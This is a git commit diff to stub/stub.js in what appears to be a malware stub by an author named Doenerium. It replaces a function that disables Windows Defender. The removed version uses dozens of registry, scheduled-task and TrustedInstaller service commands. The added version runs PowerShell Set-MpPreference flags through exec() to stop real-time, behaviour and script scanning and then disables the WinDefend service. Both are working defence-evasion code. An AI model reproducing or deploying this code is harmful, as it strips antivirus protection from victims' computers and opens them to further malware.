f234ebc59d799e1b5ab5e8b72d33bb29e2176896
Doenerium <145469894+doenerium6969@users.noreply.github.com>
2024-09-10 20:14:03 +0200

    Update stub.js

--- stub/stub.js
+++ stub/stub.js
@@ -592,73 +592,32 @@ function executeCommand(command) {
 }
 
 // Function to disable Windows Defender features
-async function disableWindowsDefender() {
-    const commands = [
-        'reg add "HKLM\\Software\\Microsoft\\Windows Defender Security Center\\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f',
-        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d "0" /f',
-        'reg delete "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d "0" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableSpecialRunningModes" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f',
-        'schtasks /Change /TN "Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh" /Disable',
-        'schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance" /Disable',
-        'schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup" /Disable',
-        'schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan" /Disable',
-        'schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Verification" /Disable',
-        'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run" /v "SecurityHealth" /f',
-        'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityHealth" /f',
-        'reg delete "HKCR\\*\\shellex\\ContextMenuHandlers\\EPP" /f',
-        'reg delete "HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP" /f',
-        'reg delete "HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP" /f',
-        'sc config TrustedInstaller binPath= "sc stop Windefend"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop WdFilter"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop WdNisDrv"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop WdNisSvc"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop MDCoreSvc"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop mpsdrv"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop mpssvc"',
-        'sc start TrustedInstaller',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\mpsdrv" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\mpssvc" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\WdFilter" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\WinDefend" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\MDCoreSvc" /v "Start" /t REG_DWORD /d "4" /f'
-    ];
+function disableWindowsDefender() {
+    const powershellCommand = `
+        Set-MpPreference -DisableRealtimeMonitoring $true;
+        Set-MpPreference -DisableBehaviorMonitoring $true;
+        Set-MpPreference -DisableBlockAtFirstSeen $true;
+        Set-MpPreference -DisableIOAVProtection $true;
+        Set-MpPreference -DisablePrivacyMode $true;
+        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true;
+        Set-MpPreference -DisableArchiveScanning $true;
+        Set-MpPreference -DisableIntrusionPreventionSystem $true;
+        Set-MpPreference -DisableScriptScanning $true;
+        Stop-Service -Name WinDefend;
+        Set-Service -Name WinDefend -StartupType Disabled;
+    `;
 
-    for (const command of commands) {
-        try {
-            const result = await executeCommand(command);
-            console.log(`Command succeeded: ${command}`);
-            console.log(result);
-        } catch (error) {
-            console.error(`Command failed: ${command}`);
-            console.error(error);
+    exec(`powershell.exe -Command "${powershellCommand}"`, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Erreur lors de la désactivation de Windows Defender: ${error.message}`);
+            return;
         }
-    }
+        if (stderr) {
+            console.error(`Erreur dans PowerShell: ${stderr}`);
+            return;
+        }
+        console.log(`Résultat: ${stdout}`);
+    });
 }
 
 
